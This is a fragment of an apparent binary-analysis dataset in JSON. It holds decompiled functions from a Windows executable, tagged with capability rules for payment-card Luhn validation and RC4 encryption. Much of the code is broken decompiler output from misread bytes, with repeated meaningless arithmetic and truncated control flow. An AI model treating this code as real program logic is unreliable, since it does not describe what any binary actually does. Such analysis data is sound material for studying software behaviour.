= *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + cVar42;\n        puVar86 = ppiVar60 & 0xffffffff;\n        *ppiVar60 = *ppiVar60 + uVar52;\n        bVar90 = CARRY1(*ppiVar60, uVar43);\n        *ppiVar60 = *ppiVar60 + uVar43;\n        iVar67 = 0x1400fdfcd;\n        if (*ppiVar60 == '\\0') {\n            *(uVar59 + 0x1400fdfd1) = *(uVar59 + 0x1400fdfd1) + uVar43 + bVar90;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *(uVar59 + 0x1414ff027) = *(uVar59 + 0x1414ff027) + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + puVar86;\n            *ppiVar60 = *ppiVar60 + uVar52;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *(unaff_RDI + 2) = *(unaff_RDI + 2) & uVar45;\n            *ppiVar60 = *ppiVar60 + uVar52;\n            uVar45 = *ppiVar60;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *0x1400fdfdd = *0x1400fdfdd >> 1 | CARRY1(uVar45, uVar43) << 7;\n            *ppiVar60 = *ppiVar60 + uVar52;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            uVar45 = *ppiVar60;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *(unaff_RBP + 0x2802) = *(unaff_RBP + 0x2802) + -0x33 + CARRY1(uVar45, uVar43);\n            *ppiVar60 = *ppiVar60 + uVar43;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        do {\n            uVar87 = ppiVar60 >> 8;\n            *(ppiVar60 + 8 + puVar86) = *(ppiVar60 + 8 + puVar86) + uVar87 + bVar90;\n            iVar85 = ppiVar60;\n            *ppiVar60 = *ppiVar60 + iVar85;\n            uVar45 = ppiVar60;\n            *ppiVar60 = *ppiVar60 + uVar45;\n            *ppiVar60 = *ppiVar60 + uVar45;\n            *ppiVar60 = *ppiVar60 + uVar45;\n            *ppiVar60 = *ppiVar60 + uVar45;\n            uVar43 = *ppiVar60;\n            *ppiVar60 = *ppiVar60 + uVar45;\n            *(unaff_RBP + 0x2802) = *(unaff_RBP + 0x2802) + iVar67 + CARRY1(uVar43, uVar45);\n            bVar90 = CARRY1(*ppiVar60, uVar45);\n            *ppiVar60 = *ppiVar60 + uVar45;\n            if (iVar67 + -1 != 0 && *ppiVar60 != '\\0') {\ncode_r0x000140104731:\n                *ppiVar60 = (*ppiVar60 - uVar45) - bVar90;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                puVar1 = ppiVar60 + -0x73;\n                uVar43 = *puVar1;\n                uVar68 = puVar86 >> 8;\n                *puVar1 = *puVar1 + uVar68;\n                *(ppiVar60 + 1) = *(ppiVar60 + 1) + uVar45 + CARRY1(uVar43, uVar68);\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *(ppiVar60 + 0x28020d) = *(ppiVar60 + 0x28020d) + uVar87;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *puVar86 = *puVar86 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *(ppiVar60 + 0x1401051) = *(ppiVar60 + 0x1401051) + uVar68;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *puVar86 = *puVar86 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                uVar43 = *ppiVar60;\n                *ppiVar60 = *ppiVar60 + puVar86;\n                *(in_stack_00000030 + 1) = *(in_stack_00000030 + 1) + cVar65 + CARRY1(uVar43, puVar86);\n                *ppiVar60 = *ppiVar60 + uVar45;\n                uVar43 = *puVar86;\n                *puVar86 = *puVar86 + uVar45;\n                *ppiVar60 = (*ppiVar60 - uVar45) - CARRY1(uVar43, uVar45);\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                puVar86 = ppiVar60 + -0x73;\n                uVar43 = *puVar86;\n                *puVar86 = *puVar86 + uVar68;\n                *(ppiVar60 + 1) = *(ppiVar60 + 1) + uVar45 + CARRY1(uVar43, uVar68);\n                *ppiVar60 = *ppiVar60 + uVar45;\n                uVar45 = uVar45 + uVar87;\n                pcVar53 = ppiVar60 & 0xffffffffffffff00 | uVar45;\n                ppiVar82[-1] = 0x14010;\n                *pcVar53 = *pcVar53 + uVar45;\n                *pcVar53 = *pcVar53 + uVar45;\n                *pcVar53 = *pcVar53 + uVar45;\n                pcVar64 = ppiVar60 & 0xffffffffffffff00 | uVar45 + *pcVar53;\n                *pcVar64 = *pcVar64 + uVar45 + *pcVar53;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *(ppiVar60 + 1) = *(ppiVar60 + 1) + uVar45 + bVar90;\n            *ppiVar60 = *ppiVar60 + uVar45;\n            uVar43 = *ppiVar60;\n            uVar68 = puVar86;\n            *ppiVar60 = *ppiVar60 + uVar68;\n            pcVar53 = ppiVar60 + in_FS_OFFSET + 1;\n            *pcVar53 = *pcVar53 + uVar45 + CARRY1(uVar43, uVar68);\n            *ppiVar60 = *ppiVar60 + uVar45;\n            *ppiVar60 = *ppiVar60 + uVar45;\n            *ppiVar60 = *ppiVar60 + uVar45;\n            *ppiVar60 = *ppiVar60 + uVar45;\n            *ppiVar60 = *ppiVar60 + uVar45;\n            *ppiVar60 = *ppiVar60 + uVar68;\n            puVar86 = ppiVar60 & 0xffffffff;\n            *ppiVar60 = *ppiVar60 + iVar85;\n            *ppiVar60 = *ppiVar60 + uVar45;\n            *(ppiVar60 + 2) = *(ppiVar60 + 2) & iVar67 + -1 >> 8;\n            *ppiVar60 = *ppiVar60 + iVar85;\n            uVar43 = *ppiVar60;\n            *ppiVar60 = *ppiVar60 + uVar45;\n            *(ppiVar60 + 8 + puVar86) = *(ppiVar60 + 8 + puVar86) + uVar87 + CARRY1(uVar43, uVar45);\n            *ppiVar60 = *ppiVar60 + iVar85;\n            *ppiVar60 = *ppiVar60 + uVar45;\n            *ppiVar60 = *ppiVar60 + uVar45;\n            *ppiVar60 = *ppiVar60 + uVar45;\n            *ppiVar60 = *ppiVar60 + uVar45;\n            uVar43 = *ppiVar60;\n            cVar42 = *ppiVar60;\n            *ppiVar60 = *ppiVar60 + uVar45;\n            uVar68 = puVar86;\n            if (!SCARRY1(cVar42, uVar45)) {\n                *(ppiVar60 + 1) = *(ppiVar60 + 1) + uVar45 + CARRY1(uVar43, uVar45);\n                *ppiVar60 = *ppiVar60 + uVar45;\n                ppiVar88 = ppiVar60 + 0xd;\n                uVar43 = *ppiVar88;\n                *ppiVar88 = *ppiVar88 + uVar87;\n                *(ppiVar60 + 1) = *(ppiVar60 + 1) + uVar45 + CARRY1(uVar43, uVar87);\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *puVar86 = *puVar86 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                puVar1 = ppiVar60 + 0x61;\n                uVar43 = *puVar1;\n                *puVar1 = *puVar1 + uVar45;\n                *(ppiVar60 + 1) = *(ppiVar60 + 1) + uVar45 + CARRY1(uVar43, uVar45);\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *puVar86 = *puVar86 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                *ppiVar60 = *ppiVar60 + uVar45;\n                uVar43 = *ppiVar60;\n                *ppiVar60 = *ppiVar60 + uVar68;\n                *(in_stack_00000030 + 1) = *(in_stack_00000030 + 1) + cVar65 + CARRY1(uVar43, uVar68);\n                *ppiVar60 = *ppiVar60 + uVar45;\n                bVar90 = CARRY1(*puVar86, uVar45);\n                *puVar86 = *puVar86 + uVar45;\n                goto code_r0x000140104731;\n            }\n            uVar44 = uVar45 + uVar87;\n            piVar63 = ppiVar60 & 0xffffffffffffff00 | uVar44;\n            iVar67 = *ppiVar82;\n            ppiVar82 = ppiVar82 + 1;\n            *(piVar63 + 1) = *(piVar63 + 1) + uVar44 + CARRY1(uVar45, uVar87);\n            *piVar63 = *piVar63 + uVar44;\n            *piVar63 = *piVar63 + uVar44;\n            *piVar63 = *piVar63 + uVar44;\n            *piVar63 = *piVar63 + uVar44;\n            *piVar63 = *piVar63 + uVar44;\n            *piVar63 = *piVar63 + uVar68;\n            *piVar63 = *piVar63 + piVar63;\n            uVar43 = *piVar63;\n            *piVar63 = *piVar63 + uVar44;\n            uVar45 = *0x1000000001401067;\n            uVar59 = *0x1000000001401067;\n            ppiVar88 = ppiVar60 & 0xffffffffffffff00 | uVar59;\n            pcVar53 = ppiVar88 + in_FS_OFFSET + 1;\n            *pcVar53 = *pcVar53 + *0x1000000001401067 + CARRY1(uVar43, uVar44);\n            *ppiVar88 = *ppiVar88 + uVar45;\n            *ppiVar88 = *ppiVar88 + uVar45;\n            *ppiVar88 = *ppiVar88 + uVar45;\n            *ppiVar88 = *ppiVar88 + uVar45;\n            *ppiVar88 = *ppiVar88 + uVar45;\n            *ppiVar88 = *ppiVar88 + uVar44;\n            puVar86 = ppiVar60 & 0xffffff00 | uVar59;\n            bVar90 = CARRY4(*ppiVar88, ppiVar88);\n            *ppiVar88 = *ppiVar88 + ppiVar88;\n            ppiVar60 = ppiVar88;\n        } while( true );\n    }\n    if (arg1[2] < arg1[3]) {\n        iVar47 = *arg1[2];\n    }\n    else {\n        pcVar3 = (*arg1)[9];\n        *(ppiVar70 + -8) = 0x14003b4b2;\n        iVar47 = (*pcVar3)(arg1);\n    }\n    bVar90 = false;\n    if (iVar47 == -1) {\n        arg1 = NULL;\n        bVar90 = bVar92;\n    }\ncode_r0x00014003aa18:\n    bVar92 = *(ppiVar70 + 0xa0) == -1;\n    if ((unaff_RBP != NULL) && (bVar92)) {\n        if (unaff_RBP[2] < unaff_RBP[3]) {\n            iVar47 = *unaff_RBP[2];\n        }\n        else {\n            pcVar3 = *(*unaff_RBP + 0x48);\n            *(ppiVar70 + -8) = 0x14003b4cf;\n            iVar47 = (*pcVar3)(unaff_RBP);\n        }\n        bVar92 = iVar47 == -1;\n    }\n    if (bVar92 == bVar90) {\n        **(ppiVar70 + 0x178) = **(ppiVar70 + 0x178) | 2;\n    }\n    iVar67 = *(ppiVar70 + 0xe0);\n    ppiVar88 = *(ppiVar70 + 0x150);\n    ppiVar88[1] = *(ppiVar70 + 0x98) & 0xffffffffffff0000 | uVar50;\n    iVar57 = *(ppiVar70 + 0x50);\n    *ppiVar88 = arg1;\n    if (iVar67 != iVar57) {\n        *(ppiVar70 + -8) = 0x14003aa74;\n        fcn.1400b64d0();\n    }\n    if (*(ppiVar70 + 0xc0) != *(ppiVar70 + 0x68)) {\n        *(ppiVar70 + -8) = 0x14003aa8b;\n        fcn.1400b64d0();\n    }\n    return *(ppiVar70 + 0x150);\ncode_r0x000140034007:\n    pcVar3 = (*unaff_R12)[2];\n    *(ppiVar78 + -8) = 0x14003401a;\n    cVar42 = (*pcVar3)(unaff_R12);\n    unaff_R13 = *(ppiVar78 + 0xc0);\n    if (cVar42 != '\\0') {\n        unaff_R14 = NULL;\n        do {\n            uVar45 = unaff_RSI == -1;\n            uVar43 = unaff_R13 != NULL && uVar45;\n            ppiVar74 = ppiVar78;\n            if (unaff_R13 != NULL && uVar45) {\n                if (unaff_R13[2] < unaff_R13[3]) {\n                    iVar47 = *unaff_R13[2];\n                }\n                else {\n                    piVar55 = *unaff_R13;\n                    *(ppiVar78 + 0x70) = uVar43;\n                    pcVar3 = piVar55[9];\n                    *(ppiVar78 + -8) = 0x14003449e;\n                    iVar47 = (*pcVar3)(unaff_R13);\n                    uVar43 = *(ppiVar78 + 0x70);\n                }\n                arg3 = uVar43;\n                uVar45 = false;\n                if (iVar47 != -1) goto code_r0x000140034278;\ncode_r0x000140034313:\n                uVar45 = arg3;\n                unaff_R13 = NULL;\n                uVar43 = 0;\n                *(ppiVar74 + 0xc0) = 0;\n                uVar87 = unaff_RDI != NULL & arg1;\n                ppiVar78 = ppiVar74;\n                uVar68 = 0;\n                if (uVar87 == 0) goto code_r0x000140034288;\ncode_r0x000140034340:\n                uVar43 = uVar68;\n                if (unaff_RDI[2] < unaff_RDI[3]) {\n                    iVar47 = *unaff_RDI[2];\n                }\n                else {\n                    piVar55 = *unaff_RDI;\n                    *(ppiVar74 + 0x70) = uVar43;\n                    pcVar3 = piVar55[9];\n                    *(ppiVar74 + -8) = 0x140034485;\n                    iVar47 = (*pcVar3)(unaff_RDI);\n                    uVar43 = *(ppiVar74 + 0x70);\n                }\n                ppiVar78 = ppiVar74;\n                if (iVar47 == -1) {\n                    unaff_RDI = NULL;\n                }\n                else {\n                    uVar87 = unaff_R14;\n                }\n            }\n            else {\ncode_r0x000140034278:\n                uVar87 = unaff_RDI != NULL & arg1;\n                uVar68 = uVar43;\n                if (uVar87 != 0) goto code_r0x000140034340;\ncode_r0x000140034288:\n                uVar87 = arg1;\n            }\n            if (uVar45 == uVar87) goto code_r0x0001400340c1;\n            if (uVar43 != 0) {\n                if (unaff_R13[2] < unaff_R13[3]) {\n                    iVar47 = *unaff_R13[2];\n                }\n                else {\n                    pcVar3 = (*unaff_R13)[9];\n                    *(ppiVar78 + -8) = 0x1400344ca;\n                    iVar47 = (*pcVar3)(unaff_R13);\n                }\n                if (iVar47 == -1) {\n                    *(ppiVar78 + 0xc0) = 0;\n                    unaff_R13 = NULL;\n                }\n            }\n            pcVar3 = (*unaff_R12)[2];\n            *(ppiVar78 + -8) = 0x1400342ae;\n            cVar42 = (*pcVar3)(unaff_R12);\n            if (cVar42 == '\\0') goto code_r0x0001400340c1;\n            if (unaff_R13[2] < unaff_R13[3]) {\n                unaff_R13[2] = unaff_R13[2] + 2;\n            }\n            else {\n                pcVar3 = (*unaff_R13)[10];\n                *(ppiVar78 + -8) = 0x1400343da;\n                (*pcVar3)(unaff_R13);\n            }\n            unaff_RSI = 0xffffffff;\n            *(ppiVar78 + 200) = 0xffff;\n        } while( true );\n    }\n    uVar45 = unaff_R13 != NULL;\n    pcVar3 = (*unaff_R12)[8];\n    *(ppiVar78 + -8) = 0x14003403f;\n    uVar46 = (*pcVar3)(unaff_R12);\n    *(ppiVar78 + 0x70) = uVar46;\n    uVar87 = uVar43 & uVar45;\n    if (uVar87 != 0) {\n        if (unaff_R13[2] < unaff_R13[3]) {\n            iVar47 = *unaff_R13[2];\n            uVar45 = uVar87;\n        }\n        else {\n            piVar55 = *unaff_R13;\n            *(ppiVar78 + 0x88) = uVar87;\n            pcVar3 = piVar55[9];\n            *(ppiVar78 + -8) = 0x140035b59;\n            iVar47 = (*pcVar3)(unaff_R13);\n            uVar45 = *(ppiVar78 + 0x88);\n        }\n        if (iVar47 == -1) {\n            *(ppiVar78 + 0xc0) = 0;\n            uVar45 = 0;\n            unaff_R13 = NULL;\n        }\n    }\n    pcVar3 = (*unaff_R12)[8];\n    *(ppiVar78 + -8) = 0x14003405d;\n    iVar47 = (*pcVar3)(unaff_R12);\n    if (*(ppiVar78 + 0x70) != iVar47) {\n        pcVar3 = (*unaff_R12)[6];\n        *(ppiVar78 + -8) = 0x140034076;\n        iVar47 = (*pcVar3)(unaff_R12);\n        if ((uVar43 != 0) && (uVar45 != 0)) {\n            if (unaff_R13[2] < unaff_R13[3]) {\n                iVar48 = *unaff_R13[2];\n            }\n            else {\n                pcVar3 = (*unaff_R13)[9];\n                *(ppiVar78 + -8) = 0x140034a2e;\n                iVar48 = (*pcVar3)(unaff_R13);\n            }\n            if (iVar48 == -1) {\n                *(ppiVar78 + 0xc0) = 0;\n            }\n        }\n        pcVar3 = (*unaff_R12)[6];\n        *(ppiVar78 + -8) = 0x140034094;\n        iVar48 = (*pcVar3)(unaff_R12);\n        unaff_R13 = *(ppiVar78 + 0xc0);\n        if (iVar47 != iVar48) {\ncode_r0x0001400340a6:\n            *(ppiVar78 + 100) = 4;\n            *(ppiVar78 + 0xd8) = 4;\n            unaff_R13 = *(ppiVar78 + 0xc0);\n            goto code_r0x0001400340c1;\n        }\n    }\ncode_r0x000140034240:\n    if (unaff_R13[2] < unaff_R13[3]) {\n        unaff_R13[2] = unaff_R13[2] + 2;\n    }\n    else {\n        pcVar3 = (*unaff_R13)[10];\n        *(ppiVar78 + -8) = 0x1400344ba;\n        (*pcVar3)(unaff_R13);\n    }\n    unaff_RSI = 0xffffffff;\n    *(ppiVar78 + 200) = 0xffff;\n    goto code_r0x0001400340c1;\ncode_r0x0001400347e9:\n    arg3 = *(ppiVar78 + 600);\n    in_stack_00000038 = ppiVar78 + 0x90;\n    puVar66 = ppiVar78 + 0xb0;\n    in_stack_00000030 = ppiVar78 + 0xa0;\n    iVar67 = *(*(ppiVar78 + 0x80) + 0x10);\n    in_XMM1_Da = *(iVar67 + 0xa8);\n    in_XMM1_Db = *(iVar67 + 0xac);\n    in_XMM1_Dc = *(iVar67 + 0xb0);\n    in_XMM1_Dd = *(iVar67 + 0xb4);\n    in_XMM5_Da = *(iVar67 + 0x68);\n    in_XMM5_Db = *(iVar67 + 0x6c);\n    in_XMM5_Dc = *(iVar67 + 0x70);\n    in_XMM5_Dd = *(iVar67 + 0x74);\n    in_XMM4_Da = *(iVar67 + 0x78);\n    in_XMM4_Db = *(iVar67 + 0x7c);\n    in_XMM4_Dc = *(iVar67 + 0x80);\n    in_XMM4_Dd = *(iVar67 + 0x84);\n    in_XMM3_Da = *(iVar67 + 0x88);\n    in_XMM3_Db = *(iVar67 + 0x8c);\n    in_XMM3_Dc = *(iVar67 + 0x90);\n    in_XMM3_Dd = *(iVar67 + 0x94);\n    puVar94 = *(iVar67 + 0x98);\n    puVar95 = *(iVar67 + 0xa0);\n    auVar93 = *(iVar67 + 0xb8);\n    in_XMM6_Da = *(iVar67 + 0x58);\n    in_XMM6_Db = *(iVar67 + 0x5c);\n    in_XMM6_Dc = *(iVar67 + 0x60);\n    in_XMM6_Dd = *(iVar67 + 100);\n    ppiVar60 = *(ppiVar78 + 0x78);\n    *(ppiVar78 + 0x30) = 0xe;\n    goto code_r0x000140034852;\n}\n",
        "token_count": 53851
    },
    "14007dba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0001400fdb4e) overlaps instruction at (ram,0x0001400fdb4d)\n// \n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffffffffff90 : 0x00014010039e\n// WARNING: Removing unreachable block (ram,0x0001401002aa)\n// WARNING: Removing unreachable block (ram,0x00014010026a)\n// WARNING: Removing unreachable block (ram,0x0001401002f2)\n// WARNING: Removing unreachable block (ram,0x0001400fd970)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint * fcn.14007dba0(uint *arg1, ulong noname_1, int64_t *arg3)\n\n{\n    uint8_t *puVar1;\n    uchar uVar2;\n    uint uVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    ulong *puVar8;\n    char cVar9;\n    char cVar10;\n    uint8_t uVar11;\n    char cVar22;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint64_t uVar14;\n    uint8_t *puVar15;\n    uint8_t *puVar16;\n    char *pcVar17;\n    int32_t *piVar18;\n    char *pcVar19;\n    int32_t *piVar20;\n    char *pcVar21;\n    uint8_t uVar23;\n    uint8_t uVar26;\n    uint32_t *puVar24;\n    uint8_t uVar27;\n    ushort uVar28;\n    uint8_t uVar30;\n    char *pcVar29;\n    uint8_t uVar31;\n    uint8_t uVar32;\n    uint **ppuVar33;\n    uint **ppuVar34;\n    uint64_t *puVar35;\n    ulong *puVar36;\n    uint64_t *puVar37;\n    uint64_t *puVar40;\n    uint64_t unaff_RBP;\n    uchar *puVar41;\n    uint8_t *unaff_RSI;\n    uint8_t *puVar42;\n    uint32_t uVar43;\n    uint32_t uVar44;\n    uint *unaff_RDI;\n    ulong *in_R9;\n    ulong in_R11;\n    char *unaff_R15;\n    int64_t in_FS_OFFSET;\n    int64_t in_GS_OFFSET;\n    bool bVar45;\n    bool bVar46;\n    bool bVar47;\n    bool bVar48;\n    ulong in_XMM1_Qa;\n    ulong *in_stack_00000028;\n    uint8_t in_stack_00000048;\n    uchar auStack256 [144];\n    ulong uStack112;\n    uint *puStack104;\n    uchar auStack96 [56];\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    ulong uStack16;\n    uint32_t *puVar25;\n    uint64_t *puVar38;\n    uint64_t *puVar39;\n    \n    ppuVar34 = &puStack104;\n    uStack24 = *in_R9;\n    uStack40 = *in_stack_00000028;\n    uVar12 = in_stack_00000048 - 100 & 0xff;\n    uStack16 = in_R9[1];\n    uVar14 = *(uVar12 * 4 + 0x1400fd700);\n    uStack32 = in_stack_00000028[1];\n    puVar15 = uVar14 + 0x1400fd700;\n    cVar9 = puVar15;\n    uVar43 = puVar15;\n    cVar10 = arg3;\n    uVar23 = arg3 >> 8;\n    uVar31 = arg1 >> 8;\n    uVar28 = SUB82(arg3, 0);\n    switch(uVar12) {\n    case 0:\n        uStack112 = 0x14007dcb2;\n        (**(*arg3 + 0x20))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &uStack24, &uStack40);\n        return arg1;\n    default:\n        uStack112 = 0x14007dce2;\n        (**(*arg3 + 0x38))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &uStack24, &uStack40);\n        return arg1;\n    case 9:\n        uStack112 = 0x14007dc82;\n        (**(*arg3 + 0x30))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &uStack24, &uStack40);\n        return arg1;\n    case 0x10:\n        uStack112 = 0x14007dc52;\n        (**(*arg3 + 0x18))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &uStack24, &uStack40);\n        return arg1;\n    case 0x13:\n        uStack112 = 0x14007dc22;\n        (**(*arg3 + 0x28))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &uStack24, &uStack40);\n        return arg1;\n    case 0x16:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x17:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x18:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x19:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x20:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x21:\n    case 0x22:\n    case 0x23:\n    case 0x91:\n    case 0x92:\n    case 0x93:\n        uStack112 = *(uVar43 + 0x2da7ffc7);\n    // WARNING: Could not recover jumptable at 0x0001400fd757. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar14 = (**(arg1 + 0x61))(uStack40, in_XMM1_Qa, uStack24);\n        return uVar14;\n    case 0x24:\n    case 0x94:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x25:\n    case 0x95:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x26:\n    case 0x96:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x27:\n    case 0x38:\n    case 0x97:\n    case 0xa8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x28:\n    case 0x39:\n    case 0x98:\n    case 0xa9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x29:\n    case 0x3a:\n    case 0x99:\n    case 0xaa:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2a:\n    case 0x9a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2b:\n    case 0x9b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2c:\n    case 0x9c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2d:\n    case 0x9d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2e:\n    case 0x9e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2f:\n    case 0x9f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x30:\n    case 0xa0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x31:\n    case 0xa1:\n        *puVar15 = *puVar15 + cVar9;\n        *(puVar15 * 2) = *(puVar15 * 2);\n        *puVar15 = *puVar15 + cVar9;\n        *0xa500000001400ffd = cVar9 + *puVar15;\n        pcVar17 = puVar15 & 0xffffffffffffff00 | *0xa500000001400ffd;\n        cVar9 = *pcVar17;\n        *pcVar17 = *pcVar17 + *0xa500000001400ffd;\n        pcVar17 = puVar15 & 0xffffff00 | *0xa500000001400ffd;\n        if (SCARRY1(cVar9, *0xa500000001400ffd)) {\n            pcVar17 = *0x1400fd700;\n        }\n        cVar9 = pcVar17;\n        *pcVar17 = *pcVar17 + cVar9;\n        *0x1400fd700 = *0x1400fd700 & 0xffffff00 | *0x1400fd700 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *0x1400fd700 = *0x1400fd700 & 0xffffff00 | *0x1400fd700 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *(unaff_RDI + 0x1400ffd) = *(unaff_RDI + 0x1400ffd) + (pcVar17 >> 8);\n        *pcVar17 = *pcVar17 + cVar9;\n        *0x1400fd700 = *0x1400fd700 & 0xffffff00 | *0x1400fd700 + uVar23;\n        if (SCARRY1(*0x1400fd700, uVar23)) {\n            pcVar17 = *0x1400fd700;\n        }\n        cVar9 = pcVar17;\n        *pcVar17 = *pcVar17 + cVar9;\n        *0x1400fd700 = *0x1400fd700 & 0xffffff00 | *0x1400fd700 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *arg3 = *arg3 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *(arg3 + 0x1400ffd) = *(arg3 + 0x1400ffd) + -0x29;\n        *pcVar17 = *pcVar17 + cVar9;\n        *(unaff_RBP + 0x1400ffd) = *(unaff_RBP + 0x1400ffd) + -0x29;\n        *pcVar17 = *pcVar17 + cVar9;\n        *unaff_RDI = *unaff_RDI + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *0x1400fd700 = *0x1400fd700 & 0xffffff00 | *0x1400fd700 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *(unaff_RBP + 0x1400ffd) = *(unaff_RBP + 0x1400ffd) + uVar23;\n        *pcVar17 = *pcVar17 + cVar9;\n        pcVar17[0x1400ffd] = pcVar17[0x1400ffd] + uVar31;\n        *pcVar17 = *pcVar17 + cVar9;\n        *arg3 = *arg3 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *arg3 = *arg3 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *(arg1 + 0x1400ffdU) = *(arg1 + 0x1400ffdU) + uVar31;\n        *pcVar17 = *pcVar17 + cVar9;\n        unaff_RSI[0x1400ffd] = unaff_RSI[0x1400ffd] + uVar31;\n        *pcVar17 = *pcVar17 + cVar9;\n        *0x1400fd700 = *0x1400fd700 & 0xffffff00 | *0x1400fd700 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *arg3 = *arg3 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        pcVar17 = pcVar17 & 0xffffffffffffff00 | cVar9 * '\\x02';\n        if (SCARRY1(cVar9, cVar9)) {\n            pcVar17 = *0x1400fd700;\n        }\n        cVar9 = pcVar17;\n        *pcVar17 = *pcVar17 + cVar9;\n        uVar31 = arg1 + cVar9;\n        pcVar21 = arg1 & 0xffffffffffffff00 | uVar31;\n        if (SCARRY1(arg1, cVar9)) {\n            pcVar17 = *0x1400fd700;\n        }\n        cVar9 = pcVar17;\n        *pcVar17 = *pcVar17 + cVar9;\n        *0x1400fd700 = *0x1400fd700 & 0xffffff00 | *0x1400fd700 + cVar9;\n        